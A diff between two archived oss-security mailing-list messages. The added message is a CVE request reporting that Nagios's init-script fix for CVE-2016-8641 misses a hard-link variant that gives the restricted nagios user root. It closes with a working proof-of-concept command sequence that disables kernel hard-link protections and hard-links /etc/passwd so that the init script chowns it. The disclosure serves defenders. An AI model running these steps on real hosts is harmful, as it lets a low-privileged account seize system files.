@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1799" "Tuesday" "3" "November" "2015" "13:52:26" "-0500" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20151103185226.45DD96C00FD@smtpvmsrv1.mitre.org>" "43" "[oss-security] Re: CVE request: libsndfile 1.0.25 heap overflow" nil nil nil "11" "2015110318:52:26" "[oss-security] Re: CVE request: libsndfile 1.0.25 heap overflow" (number mark "U       cve-assign@m Nov  3   43/1799  " thread-indent "\"[oss-security] Re: CVE request: libsndfile 1.0.25 heap overflow\"\n") "<87y4ef9s4i.fsf@redhat.com>" ("<87y4ef9s4i.fsf@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3285" "Friday" "30" "December" "2016" "13:37:37" "-0500" "Michael Orlitzky" "michael@orlitzky.com" "<e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>" "96" "[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641" nil nil nil "12" "2016123018:37:37" "[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641" (number mark "U       michael@orli Dec 30   96/3285  " thread-indent "\"[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 12260 invoked by uid 550); 3 Nov 2015 18:52:39 -0000
+Received: (qmail 20392 invoked by uid 550); 30 Dec 2016 19:07:43 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,55 +12,117 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 12240 invoked from network); 3 Nov 2015 18:52:38 -0000
-From: cve-assign@mitre.org
-To: mprpic@redhat.com
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-In-Reply-To: <87y4ef9s4i.fsf@redhat.com>
-Message-Id: <20151103185226.45DD96C00FD@smtpvmsrv1.mitre.org>
-Date: Tue,  3 Nov 2015 13:52:26 -0500 (EST)
-Subject: [oss-security] Re: CVE request: libsndfile 1.0.25 heap overflow
+Received: (qmail 3711 invoked from network); 30 Dec 2016 18:38:07 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=orlitzky.com; s=mail2;
+	t=1483123075; bh=la/cEcF9atjjFi/ouUs8QYKEbg1nKISOyCtQtW10iT0=;
+	h=To:From:Subject:Date;
+	b=mVNOTxnXwqdki07FAu+vOfVO5fD2+vY9/UT8TDGc5nc9p6qsM5kfbTd6/VE4X5npx
+	 SNGosqyxd1NYuZMJyLMuYluhe+BbhCzUb3OYkbrBbC7/VLuil67XHTWpd4ZFWS3nJp
+	 5pLv7sM2CuvdHwFplp5PFHMRM1XPeOjUt26ktY7Q=
+To: oss-security@lists.openwall.com
+From: Michael Orlitzky <michael@orlitzky.com>
+Message-ID: <e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>
+Date: Fri, 30 Dec 2016 13:37:37 -0500
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.5.1
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Author: Michael Orlitzky (michael@orlitzky.com)
+Software Name: Nagios
+Vendor Name: Nagios Enterprises, LLC
+Type of vulnerability: root privilege escalation
+Reported to vendor: 2016-12-26
 
-> http://www.nemux.org/2015/10/13/libsndfile-1-0-25-heap-overflow/
-> https://packetstormsecurity.com/files/133926/libsndfile-1.0.25-Heap-Overflow.html
-> https://www.exploit-db.com/exploits/38447/
-> 
-> The blog post mentions MITRE was notified but I don't see a CVE anywhere
-> for this issue.
-> 
-> Has a CVE been assigned to this flaw yet?
+Exploit Vector
+--------------
+The init script for Nagios calls "chown" on a path under the control of
+Nagios's (usually restricted) user. CVE-2016-8641 describes an attack
+wherein that restricted user replaces the aforementioned path with a
+symlink. The root user (via the init script) will -- the next time
+Nagios is started -- give ownership of the symlink's target to Nagios's
+user. In that manner, the restricted Nagios user can gain root.
 
-Actually, yes, a CVE was assigned a while ago: CVE-2015-7805.
+An identical attack not addressed by CVE-2016-8641 works with hard
+links. As long as no special kernel protections are in place, the
+restricted Nagios user can replace the path (in the directory he
+controls) by a hard-link. The call to "chown" in the init script affects
+the target of that hard link.
 
-We realize that the www.nemux.org URL says "09 Oct 2015 Mitre.org
-contacted (no response)"; however, we actually did respond on that
-day. (The person who wanted a CVE ID wrote to us from two e-mail
-addresses, one of which did not work for us. The person wrote to us a
-few weeks ago confirming that they did receive the CVE ID. We will
-follow up.)
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+Attack outcome
+--------------
+The restricted Nagios user gains control of any file on the same
+filesystem as its runtime directory.
 
-iQIcBAEBCAAGBQJWOQHDAAoJEL54rhJi8gl57v0QAKvk5hbqh4TEIa59vXyRZPKS
-Uo9lRR7nfzQvyFz39bA3mXjpFCjgVouNG22gYGsdTSLd7LI6vkM5Sd2MEyHaECo1
-6NjlfMDMRsHODW8m0aqdQ3y2stGuq/OHjN4e0JMzFyEaJoA8Eu7+6Ro9W1JNgtiQ
-z6Zzmko92WCoCzM5cBuI73vewSk9J5INgnESQdNHTcmX1qridbFs3msiONFGk662
-b43JNA2P0ZuVV0XZkaNYdbzSM+amv0fzRtULNIZfexs3q5kZrWFag/qavaThzg9w
-Tqph8mQUCAgZrIBPSWSgF/9rT3YAoIZoaXEbxVZf8hN424dwxlcK0ev2A2mPDNrF
-flItMzePSSzlRkOAz32EBJhSLBMlEiVVYElfiLR2/OkKPyg2FquU0uM8IUqRR0zR
-AO1RHpt8RczaxxXPlR/hmVlt/jhkc8mulErEXKLxE8ie+zvRKAlTB/OreU1KZrKP
-DZ6pLaokp+uTsvLbobbbiUNF6p3EL7pJanHFxQr9AQyjPuJUKKacmwMASCDlB0YQ
-i1nU5y2Ki0tJU5NsmVMcqpMPObkuEOY2ISsDSGOUObCSLm1X6+pCa0vBUoUK9gtX
-0D41ZWr9dM+RPvvIw3M6DTx2OUTY9s7O4J+Zq1TBAug8ady1edgYnA6ejJ+zIxvv
-pvMRRZ9PmSBDK3RF3TqK
-=j8S/
------END PGP SIGNATURE-----
+
+Affected versions
+-----------------
+Versions 4.2.2 and older are affected by the symlink attack of
+CVE-2016-8641; those and newer versions, up to the current version
+4.2.4, are affected by the hard-link attack.
+
+
+Source code
+-----------
+The fix for CVE-2016-8641 is contained in the following commit, which
+prohibits "chown" from following symlinks only (via the --no-dereference
+flag):
+
+https://github.com/NagiosEnterprises/nagioscore/commit/f2ed227673d3b2da643eb5cad26b2d87674f28c1
+
+
+Mitigation
+----------
+The creation of the problematic hard link is blocked if the user has the
+fs.protected_hardlinks sysctl enabled. It is *not enabled* by default in
+the vanilla Linux kernel, but some distributions patch that default.
+
+It can be enabled with (as root):
+
+  sysctl -w fs.protected_hardlinks=1
+
+The grsecurity patches for the Linux kernel provide similar protection
+when CONFIG_GRKERNSEC_LINK=y.
+
+
+Exploit
+-------
+
+The following commands should grant ownership of /etc/passwd to the new,
+restricted "nagios" user. Beware that in order for the attack to work,
+some important (but non-default) sysctls are disabled. The two paths
+/etc/passwd and /usr/local/nagios must live on the same filesystem.
+Afterwards you should re-enable the two sysctls (if they were enabled to
+begin with), clean up /usr/local, and remove the "nagios" user.
+
+  sudo mkdir -p /usr/local/tmp \
+                /usr/local/etc/init.d \
+                /usr/local/etc/apache2
+  sudo chmod 777 /usr/local/tmp
+
+  wget
+https://github.com/NagiosEnterprises/nagioscore/archive/release-4.2.4.tar.gz
+  tar -xf release-4.2.4.tar.gz
+  rm release-4.2.4.tar.gz
+  cd nagioscore-release-4.2.4
+  sudo useradd nagios -m -d /home/nagios
+  ./configure --with-nagios-user=nagios \
+              --with-temp-dir=/usr/local/tmp \
+              --with-init-dir=/usr/local/etc/init.d \
+              --with-httpd-conf=/usr/local/etc/apache2
+  make all
+  sudo make install
+  sudo make install-config
+  sudo make install-init
+  sudo sysctl -w kernel.grsecurity.linking_restrictions=0
+  sudo sysctl -w fs.protected_hardlinks=0
+
+  sudo -u nagios -s
+  ln -f /etc/passwd /usr/local/nagios/var/nagios.log
+  exit
+
+  sudo /usr/local/etc/init.d/nagios start
+  ls /etc/passwd
